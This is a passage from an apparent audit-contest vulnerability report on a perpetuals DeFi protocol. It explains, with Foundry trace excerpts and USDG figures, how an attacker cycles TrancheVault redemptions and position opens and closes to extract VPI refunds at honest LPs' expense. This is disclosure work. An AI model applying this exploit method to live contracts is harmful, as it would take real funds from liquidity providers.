Suite result: ok. 3 passed; 0 failed; 0 skipped
```

Expected vs. observed. VPI telescopes at unchanged depth ([WHITEPAPER.md#L850-L852](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L850-L852)), so a full round trip should leave LP value unchanged; the attacker's redemption lowers depth before the close, and the clamp holds the refund at exactly the charge. Depth is not the cause: in `test_JuniorExitPaysWithDepthRestoredBeforeClose` a third party's Junior deposit activates in the same settlement as the redemption, depth at the close (59,432,270.93 USDG) is above depth at the open (59,418,555.22 USDG), and the attacker still nets 3,512.48 USDG in one cycle. In the attack run of test 1 the `-vvvv` trace of cycle 1 shows `ClaimantInflowAccounted(caller: CfdEngineSettlementSidecar, kind: 0, cashMode: 0, amountAssets: 28489392552)` (Revenue, CashArrived) with `PositionOpened(... sizeDelta: 8798500000000000000000000, price: 99975000 ...)`, then `PletherOracle::updatePrice(..., 3)` (`PriceMode.PoolReconcile`) and `HousePool::settleLpEpoch(100000000, 1710176401)` → `TrancheVault::fundRedeemEpoch(475049, 9515205282845253, 9525443419826)`, then `HousePool::payOut(MarginClearinghouse, 24969112702)` (the 28,489.39 VPI less the 3,520.28 close fee), `ActionRebateSettled(... paidAssets: 24969112702, waivedAssets: 0)` and `PositionClosed(... price: 100025000, pnl: -4399250000)`. Every order and settlement passes through `PletherOracle::updatePrice` on `MockPyth` updates, and every attack cycle asserts a live, non-FAD market. Each order executes in a later block than its commit with a publish time after the commit, as `OrderRouterExecutionSidecar` requires. The attacker is one account that acts only through `TrancheVault` and `OrderRouter`; the trace contains no `vm.mockCall`, the test contract executes orders as an ordinary keeper, and the owner calls are seed setup and the documented release configuration. The price is held flat at 1.00 at the 10 bps confidence the oracle still accepts, and gas and Pyth update fees are not counted. The control repeats the attacker's redemptions and re-deposits without the trades, so the difference isolates the VPI round trip. The final honest-LP redemption shows the loss in real USDG: the funded cash plus the value of any shares the capacity left queued, in both runs.
